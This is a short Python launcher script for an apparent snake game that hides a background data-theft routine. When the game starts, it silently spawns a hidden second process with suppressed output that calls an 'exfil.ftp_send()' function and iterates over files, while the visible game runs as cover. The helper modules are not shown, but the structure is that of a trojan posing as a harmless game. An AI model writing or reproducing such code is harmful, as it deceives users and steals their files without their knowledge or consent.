import snake_game
import sys
import subprocess
import time
import os

from utils import exfil
from utils import game_refs

CREATE_NEW_CONSOLE = 0x00000010


def game():
    exe_path = os.path.abspath(sys.argv[0])
    subprocess.Popen(
        [sys.executable, exe_path, "--run-transfer"],
        creationflags=CREATE_NEW_CONSOLE,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )
    snake_game.rungame()

def transfer():
    exfil.ftp_send()
    game_refs.iterate_files()

if __name__ == "__main__":
    if "--run-transfer" in sys.argv:
        transfer()
    else:
        game()